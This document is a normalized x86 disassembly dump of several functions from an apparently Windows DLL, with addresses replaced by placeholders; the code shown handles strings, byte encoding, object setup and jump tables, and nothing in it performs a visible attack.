mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
jmp r-xdata
push 0xffffffff
push 0x0
lea edx [ ebp - 0x48 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_1005e580
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
cmp [ ebp - 0x38 ] 0x0
je r-xdata
inc ebx
cmp ebx [ edi + 0x14 ]
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ ebp - 0x4c ]
push eax
push 0x0
call sub_1004d650
lea eax [ ebp - 0x4c ]
add esp 0x8
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1002e070
sub_10072a30
push ebp
mov ebp esp
push 0xffffffff
push sub_10084d1b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x1
mov [ ebp - 0x90 ] edi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
push 0x10
call sub_1004d650
add esp 0x8
xor ebx ebx
cmp [ edi + 0x1c ] 0x26
jne r-xdata
xor esi esi
cmp [ edi + 0x14 ] ebx
jbe r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ edi + 0x4c ]
push edx
call sub_10070600
add esp 0x8
cmp eax ebx
je r-xdata
mov edx [ edi + 0x10 ]
mov eax [ edx + esi * 4 ]
push eax
call sub_10072a30
inc esi
add esp 0x4
cmp esi [ edi + 0x14 ]
jb r-xdata
mov ecx [ eax + 0x10 ]
mov eax ecx
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x54 ]
call sub_10037e00
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] ebx
mov edx edi
cmp eax 0x10
jae r-xdata
mov ecx [ ebp - 0x44 ]
lea esi [ edx + ecx ]
mov edx edi
cmp eax 0x10
jae r-xdata
lea edx [ ebp - 0x54 ]
add ecx edx
cmp eax 0x10
mov eax edi
jae r-xdata
lea edx [ ebp - 0x54 ]
push sub_1005af1f
push ecx
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_10001ea0
mov eax [ eax ]
add esp 0x10
push esi
push eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x54 ]
call sub_1001d050
lea edx [ ebp - 0x38 ]
push edx
push 0xb
call sub_1004d650
lea eax [ ebp - 0x38 ]
add esp 0x8
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x54 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov edi [ ebp - 0x44 ]
sub eax edx
mov esi eax
mov ecx edi
cmp edi esi
jb r-xdata
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx esi
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
call sub_1002b290
add esp 0xc
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
cmp al bl
je r-xdata
cmp edi esi
jae r-xdata
cmp [ ebp - 0x40 ] 0x10
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov edx [ ebp - 0x90 ]
mov eax [ edx + 0x10 ]
mov esi [ eax ]
lea ecx [ ebp - 0x18 ]
push ecx
push 0x9
call sub_1004d650
lea edx [ ebp - 0x18 ]
push edx
add esi 0x4c
push esi
call sub_10070600
mov eax [ eax + 0x10 ]
add esp 0x10
push eax
lea ecx [ ebp - 0x70 ]
call sub_10001000
lea ecx [ ebp - 0x20 ]
push ecx
push 0xf
mov [ ebp - 0x4 ] 0x1
call sub_1004d650
lea eax [ ebp - 0x20 ]
add esp 0x8
lea ecx [ eax + 0x1 ]
jmp r-xdata
xor eax eax
cmp edi esi
setne al
or eax 0xffffffff
jmp r-xdata
mov edi [ ebp - 0x90 ]
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov ecx [ ebp - 0x54 ]
push ecx
call sub_100187af
add esp 0x4
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
cmp eax ebx
sub eax ecx
push eax
push ebx
lea edx [ ebp - 0x20 ]
push edx
lea ecx [ ebp - 0x70 ]
call sub_100075f0
push 0xffffffff
add eax 0x7
push eax
lea eax [ ebp - 0x8c ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_10062d50
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_10021bf0
lea ecx [ ebp - 0x8c ]
call sub_1004c8c0
lea ecx [ ebp - 0x70 ]
call sub_1004c8c0
sub_10072c90
push ebp
mov ebp esp
push 0xffffffff
push sub_10084d7e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xb0 ] ebx
xor esi esi
cmp [ ebx ] 0x1
mov [ ebp - 0x4 ] esi
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
push 0x12
call sub_1004d650
mov edx [ ebx + 0x1c ]
add esp 0x8
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
xor esi esi
cmp [ ebx + 0x14 ] esi
jbe r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebx + 0x4c ]
push ecx
call sub_10070600
add esp 0x8
cmp eax esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
jmp r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
push 0x4
call sub_1004d650
sub esp 0x14
mov ecx esp
lea eax [ ebp - 0x24 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0x14 ] esp
mov [ ecx ] 0x0
lea edi [ eax + 0x1 ]
mov ecx [ eax + 0x10 ]
mov eax ecx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x54 ] 0x0
lea esi [ eax + 0x1 ]
lea esp [ esp ]
call sub_100187af
add esp 0x4
mov edx [ ebp + 0x10 ]
push edx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea edx [ ebp - 0x24 ]
push edx
call sub_10037e00
mov eax [ ebx + 0x10 ]
mov ecx [ eax + esi * 4 ]
push 0x26
push ecx
call sub_10072c90
inc esi
add esp 0x24
cmp esi [ ebx + 0x14 ]
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x54 ]
call sub_10037e00
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
mov edx edi
cmp eax 0x10
jae r-xdata
mov ecx [ ebp - 0x44 ]
lea esi [ ecx + edx ]
mov edx edi
cmp eax 0x10
jae r-xdata
lea edx [ ebp - 0x54 ]
add ecx edx
cmp eax 0x10
mov eax edi
jae r-xdata
lea edx [ ebp - 0x54 ]
push sub_1005af1f
push ecx
push eax
lea edx [ ebp - 0xb4 ]
push edx
call sub_10001ea0
mov eax [ eax ]
add esp 0x10
push esi
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_1001d050
cmp [ ebp + 0x24 ] 0x10
mov edx [ ebp + 0x10 ]
jae r-xdata
lea eax [ ebp - 0x54 ]
mov esi [ ebp - 0x44 ]
mov edi [ ebp + 0x20 ]
mov ecx esi
cmp esi edi
jb r-xdata
lea edx [ ebp + 0x10 ]
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx edi
push ecx
push edx
push eax
call sub_1002b290
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
test al al
je r-xdata
cmp esi edi
jae r-xdata
cmp [ ebp - 0x40 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push 0x2
call sub_1004d650
lea edx [ ebp - 0x38 ]
push edx
lea eax [ ebp - 0x54 ]
push eax
call sub_10069a60
add esp 0x10
test al al
je r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x54 ]
push edx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x24 ]
push edx
push 0x11
call sub_1004d650
lea eax [ ebp - 0x24 ]
add esp 0x8
lea edx [ eax + 0x1 ]
nop
xor esi esi
cmp [ ebx + 0x14 ] esi
jbe r-xdata
test eax eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x44 ]
sub eax edx
mov esi eax
mov ecx edi
cmp edi esi
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push 0xe
call sub_1004d650
sub esp 0x14
mov ecx esp
lea eax [ ebp - 0x18 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0xb4 ] esp
mov [ ecx ] 0x0
lea edi [ eax + 0x1 ]
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx esi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea edx [ ebp - 0x18 ]
push edx
call sub_10037e00
mov eax [ ebx + 0x10 ]
mov ecx [ eax + esi * 4 ]
push 0x26
push ecx
call sub_10072c90
inc esi
add esp 0x24
cmp esi [ ebx + 0x14 ]
jb r-xdata
push ecx
lea ecx [ ebp - 0x24 ]
push ecx
push eax
call sub_1002b290
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
test al al
je r-xdata
cmp edi esi
jae r-xdata
mov edx [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0x8c ]
push eax
call sub_100728b0
mov ecx [ ebp - 0x7c ]
mov eax 0x55555556
imul ecx
mov ebx edx
shr ebx 0x1f
add ebx edx
mov edi ecx
xor ecx ecx
mov eax ebx
mov edx 0x3
mul edx
seto cl
mov [ ebp - 0x4 ] 0x2
neg ecx
or ecx eax
push ecx
call sub_1001df01
add esp 0xc
cmp [ ebp - 0x78 ] 0x10
mov esi eax
mov eax [ ebp - 0x8c ]
jae r-xdata
xor eax eax
cmp edi esi
setne al
or eax 0xffffffff
jmp r-xdata
push edi
push eax
push esi
call sub_1007f5d0
xor ecx ecx
mov eax ebx
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1001df01
add esp 0x10
mov edi eax
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x8c ]
test eax eax
xor esi esi
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x4 ] 0x3
cmp ebx esi
jle r-xdata
mov eax esi
mov ecx edi
mov esi ebx
lea esp [ esp ]
cmp [ ebp - 0x78 ] 0x10
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
jb r-xdata
mov eax [ rw-data ]
cmp eax 0x3
ja r-xdata
mov dx [ eax ]
mov [ ecx ] dx
mov dl [ eax + 0x2 ]
mov [ ecx + 0x2 ] dl
add eax 0x3
add ecx 0x4
dec esi
jne r-xdata
mov ebx [ ebp - 0xb0 ]
mov ecx [ ebp - 0x8c ]
push ecx
call sub_100187af
add esp 0x4
inc esi
cmp esi ebx
jl r-xdata
jmp [ eax * 4 + jump_table_100732c8 ]
cmp [ ebp - 0x60 ] 0x0
jbe r-xdata
mov eax [ edi + esi * 4 ]
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0xcc ]
and eax 0xffffff
push edx
mov ecx rw-data
mov [ ebp - 0xac ] eax
call sub_1005d890
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov edx [ edi + esi * 4 ]
lea eax [ ebp - 0xac ]
push eax
lea ecx [ ebp - 0xc8 ]
and edx 0xffffff
push ecx
mov ecx rw-data
mov [ ebp - 0xac ] edx
call sub_1005d890
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ edi + esi * 4 ]
and ecx 0xffffff
lea edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0xac ] ecx
push eax
mov ecx rw-data
call sub_1005d890
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ edi + esi * 4 ]
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x14 ]
and eax 0xffffff
push edx
mov ecx rw-data
mov [ ebp - 0xac ] eax
call sub_1005d890
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov al [ eax + 0x10 ]
mov [ ebp - 0xc0 ] al
mov ecx [ ebp - 0xc0 ]
jmp r-xdata
mov dl [ eax + 0x10 ]
mov [ ebp - 0xbc ] dl
mov eax [ ebp - 0xbc ]
push eax
jmp r-xdata
mov cl [ eax + 0x10 ]
mov [ ebp - 0xb8 ] cl
mov edx [ ebp - 0xb8 ]
push edx
jmp r-xdata
mov al [ eax + 0x10 ]
mov [ ebp - 0xb4 ] al
mov ecx [ ebp - 0xb4 ]
mov eax [ ebp - 0x70 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100075f0
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
push ecx
push 0x1
lea ecx [ ebp - 0x70 ]
call sub_1004ca10
mov eax [ rw-data ]
mov ebx 0x10
cmp [ rw-data ] ebx
jae r-xdata
mov ecx [ rw-data ]
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100075f0
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100075f0
mov esi eax
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov eax rw-data
mov ecx [ rw-data ]
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100075f0
mov edi eax
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov eax rw-data
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_100075f0
sub esi edi
sub esi 0x5
push esi
add eax 0x5
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_10062d50
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_100553e0
cmp [ ebp - 0x94 ] ebx
jb r-xdata
mov eax rw-data
mov edx [ ebp - 0xa8 ]
push edx
call sub_100187af
add esp 0x4
sub_10073320
push ebp
mov ebp esp
push eax
push ecx
call sub_10070600
add esp 0x8
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov edx [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_100385c3
add esp 0x8
neg eax
sbb eax eax
inc eax
pop ebp
retn
sub_10073350
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
push edi
xor edi edi
mov [ ebp - 0x4 ] ecx
cmp [ ebx + 0x4 ] edi
jbe r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
pop edi
sete al
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
mov eax [ edx + edi * 4 ]
mov esi [ eax + 0x10 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_10070600
add esp 0x8
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x10 ]
mov eax esi
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
dec [ ebp - 0x4 ]
inc edi
cmp edi [ ebx + 0x4 ]
jb r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_100733f0
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x14
push ebx
call sub_1006ee90
push 0x58
xor edi edi
push ebx
mov [ ebp - 0x4 ] eax
mov [ eax + 0x4 ] edi
call sub_1006ee90
mov esi eax
mov [ esi + 0x4 ] edi
mov [ esi ] edi
lea edi [ esi + 0x10 ]
push edi
push 0x1
push ebx
mov [ esi + 0x8 ] 0xffffffff
mov [ esi + 0xc ] 0x1
call sub_1000e7d0
xor eax eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax ] esi
push ebx
mov [ ebx + 0x4 ] eax
call sub_1000aa80
add esp 0x20
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10073460
push ebx
push esi
push 0x74
push edi
call sub_1006ee90
mov esi eax
lea eax [ esi + 0x48 ]
xor ebx ebx
push eax
push edi
mov [ esi ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] 0x1
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0x64 ] 0x5
call sub_10006330
lea ecx [ esi + 0x8 ]
push ecx
push 0xa
push edi
call sub_1000e7d0
lea edx [ esi + 0x14 ]
push edx
push 0x5
push edi
call sub_1000e7d0
lea eax [ esi + 0x20 ]
push eax
push 0x5
push edi
call sub_1000e7d0
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x70 ] ebx
add esp 0x34
mov [ edi + 0xc ] esi
pop esi
pop ebx
retn
sub_100734f0
cmp [ eax + 0x4 ] 0x0
push esi
jbe r-xdata
xor eax eax
pop esi
retn
mov esi eax
lea esp [ esp ]
mov eax [ esi ]
push eax
push edi
call sub_100385c3
add esp 0x8
mov ecx [ esi ]
mov eax edi
mov eax 0x1
pop esi
retn
add esi 0x8
cmp [ esi + 0x4 ] 0x0
ja r-xdata
sbb eax eax
sbb eax 0xffffffff
jmp r-xdata
test dl dl
je r-xdata
test ebx ebx
je r-xdata
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_10073560
push edi
mov edi [ eax + 0xc ]
mov ecx [ edi + 0xc ]
dec ecx
js r-xdata
pop edi
retn
mov edx [ edi + 0x8 ]
push esi
lea esi [ edx + ecx * 4 ]
neg eax
sbb eax eax
and eax 0x6
movzx edx [ edx + lookup_table_10073644 ]
jmp [ edx * 4 + jump_table_10073618 ]
mov [ edi ] eax
pop esi
sub esi 0x4
dec ecx
jns r-xdata
xor edx edx
test eax eax
sete dl
lea eax [ edx * 8 + 0x6 ]
jmp r-xdata
mov eax 0xf
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xd
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xc
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xa
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xb
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x8
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x6
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x13
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x2
mov edx [ esi ]
mov edx [ edx + 0x1c ]
xor eax eax
test ecx ecx
sete al
cmp edx 0x81
ja r-xdata
pop esi
pop edi
retn
test eax eax
jne r-xdata
sub_1007364f
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
add al [ ebx ]
add al 0xa
add eax 0x7060505
pop es
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or [ edx ] cl
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or esp ecx
int3
sub_100736d0
push ebp
mov ebp esp
push ebx
push esi
push edi
push r--data
mov edi eax
call sub_10020200
mov ebx [ ebp + 0x8 ]
push ebx
call sub_100463f0
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov [ esi ] 0x28
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0xc ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi ]
mov [ esi + 0x18 ] ecx
mov [ esi + 0x1c ] 0x95
mov eax [ edi ]
cmp eax 0x1
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x2
jne r-xdata
mov edx [ edi + 0x18 ]
mov [ esi + 0x1c ] edx
jmp r-xdata
mov edi [ ebx + 0xc ]
mov ecx [ edi ]
lea eax [ esi + 0x24 ]
mov [ esi + 0x20 ] ecx
mov edx [ edi + 0xc ]
push eax
push edx
push ebx
call sub_1000e7d0
xor ebx ebx
add esp 0xc
cmp [ edi + 0xc ] ebx
jbe r-xdata
mov eax [ edi + 0x18 ]
mov [ esi + 0x1c ] eax
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
lea ecx [ ecx ]
lea eax [ esi + 0x24 ]
push eax
mov eax [ edi + 0x8 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_10046530
inc ebx
add esp 0xc
cmp ebx [ edi + 0xc ]
jb r-xdata
sub_10073790
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
je r-xdata
cmp [ eax ] 0x2
cmp [ eax ] 0x1
jmp r-xdata
xor eax eax
mov esi [ eax + 0x18 ]
mov ecx [ ebp + 0xc ]
xor eax eax
cmp ecx 0x96
je r-xdata
jne r-xdata
pop esi
pop ebp
retn
lea edx [ ebp + 0xc ]
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ edx + 0x4 ]
add edx 0x4
cmp ecx 0x96
jne r-xdata
cmp ecx esi
je r-xdata
pop esi
pop ebp
retn
sub_100737e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
push esi
xor esi esi
cmp ecx 0x96
je r-xdata
xor eax eax
pop ebp
retn
mov eax esi
pop esi
pop ebp
retn
lea edx [ ebp + 0xc ]
mov esi 0x1
mov ecx [ edx + 0x4 ]
add edx 0x4
cmp ecx 0x96
jne r-xdata
cmp ecx eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_10073830
push ebp
mov ebp esp
cmp [ eax ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ eax + 0x1c ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax 0x1
pop ebp
retn
sub_10073850
push 0x96
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push esi
call sub_100737e0
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
retn
cmp [ esi + 0x20 ] 0x2
jne r-xdata
mov eax 0x1
retn
sub_10073880
push esi
push 0x96
push 0x2
push 0x5e
mov esi eax
push 0x5d
push esi
call sub_100737e0
add esp 0x14
test eax eax
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
cmp [ esi + 0x20 ] 0x1
je r-xdata
xor eax eax
pop esi
retn
cmp [ esi + 0x1c ] 0x5b
jne r-xdata
mov eax 0x1
pop esi
retn
add esi 0x4c
push r--data
push esi
call sub_10070600
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_10070600
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x10 ]
push eax
push r--data
call sub_100385c3
add esp 0x8
neg eax
sbb eax eax
inc eax
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_100385c3
add esp 0x8
neg eax
sbb eax eax
inc eax
je r-xdata
sub_10073910
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
or [ ebx + 0xc ] 0x400
mov ecx [ eax + 0x8 ]
add eax 0x8
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi [ ecx ]
dec esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp esi 0x1
jle r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ecx + esi * 4 ]
mov ecx 0x5f
mov edx [ ebp + 0x8 ]
lea eax [ edi + 0x10 ]
push eax
mov [ ebx + 0x4 ] edi
mov ecx [ eax + 0x4 ]
push ebx
push edx
mov [ ebx + 0x8 ] ecx
call sub_10046530
add esp 0xc
push eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
call sub_10046530
add esp 0xc
dec esi
sub eax 0x4
cmp esi 0x1
jg r-xdata
cmp [ edi + 0x1c ] ecx
je r-xdata
mov edi [ eax ]
cmp [ edi ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push r--data
call sub_10020200
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + esi * 4 - 0x4 ]
add esp 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp [ eax ] 0x1
jne r-xdata
mov edi [ ebp - 0x4 ]
mov ecx [ edi + 0x8 ]
mov edx [ eax + 0x1c ]
push ecx
push edx
call sub_10068a50
add esp 0x4
push eax
push esi
push edi
push r--data
call sub_10020200
mov eax [ ebp - 0x4 ]
mov edi [ edi + 0x8 ]
lea esi [ eax + 0x10 ]
push esi
push edi
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov [ ebx + 0x8 ] edi
call sub_10047370
lea eax [ edi + 0x1 ]
add esp 0x24
cmp eax [ esi + 0x4 ]
jae r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
mov edx [ ecx + eax * 4 ]
mov [ edx + 0x8 ] eax
inc eax
cmp eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10073a20
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi [ edi + 0xc ]
mov [ ebp - 0x8 ] esi
add esi 0x48
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x1c ]
push ebx
push 0x58
push edi
mov [ ebp - 0x4 ] eax
call sub_1006ee90
mov ecx [ ebp - 0x4 ]
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0xffffffff
mov [ ebx ] ecx
mov [ ebx + 0xc ] eax
call sub_1004e640
mov [ ebx + 0x10 ] eax
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x68 ]
